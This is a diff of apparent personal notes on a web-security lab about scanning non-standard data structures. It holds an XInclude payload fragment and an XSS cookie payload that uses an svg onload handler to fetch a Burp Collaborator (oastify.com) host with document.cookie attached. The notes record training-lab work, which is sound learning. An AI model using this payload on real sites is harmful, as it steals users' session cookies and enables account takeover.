@@ -80,13 +80,16 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
 ```
 
 
+## LABS
+**Scanning non-standard data structures**
 
-# Lab: Scanning non-standard data structures
-
-cookie is in clear  i used inersion point active scanner on cookie
+cookie is in clear  i used insertion point active scanner on cookie
 
 found this 
-`Cookie: session='"><svg/onload%253dfetch(`//1987gwtghw3p43mm1p1ytu4ndej573vs.oastify.com/${encodeURIComponent(document.cookie)}`)>%253aezULxEJkw6I7OLWHWaxkEOf8Y6ksGMwD`
+```
+Cookie: session='"><svg/onload%253dfetch(`//1987gwtghw3p43mm1p1ytu4ndej573vs.oastify.com/${encodeURIComponent(document.cookie)}`)>%253aezULxEJkw6I7OLWHWaxkEOf8Y6ksGMwD
+```
+
 
 placed a collabraor  and encodeURIComponent inside it 
 
